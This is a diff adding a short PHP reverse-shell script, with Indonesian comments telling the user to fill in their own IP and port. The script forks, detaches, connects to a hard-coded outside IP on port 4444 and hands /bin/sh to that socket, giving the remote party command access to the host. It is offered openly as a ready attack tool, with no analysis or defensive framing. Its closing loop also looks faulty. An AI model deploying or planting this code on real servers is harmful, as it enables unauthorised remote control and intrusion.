@@ -1,0 +1,41 @@
+<?php
+// PHP Reverse Shell - Simple & Clean
+// Ganti IP dan PORT sesuai punya lo
+
+$ip = '109.110.188.152';  // Contoh: 123.456.789.000
+$port = 4444;     // Port listener
+
+if (!function_exists('pcntl_fork')) {
+    die("PCNTL tidak support");
+}
+
+$pid = pcntl_fork();
+if ($pid == -1) {
+    die("Fork gagal");
+} else if ($pid) {
+    exit(); // Parent keluar
+} else {
+    // Child process
+    if (posix_setsid() == -1) {
+        die("Setsid gagal");
+    }
+
+    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
+    if (!$sock) {
+        die("Koneksi gagal");
+    }
+
+    $descriptorspec = array(
+        0 => $sock,
+        1 => $sock,
+        2 => $sock
+    );
+
+    $process = proc_open('/bin/sh', $descriptorspec, $pipes);
+    if (is_resource($process)) {
+        while (!feof($pipes[1])) {
+            proc_close($process);
+        }
+    }
+}
+?>
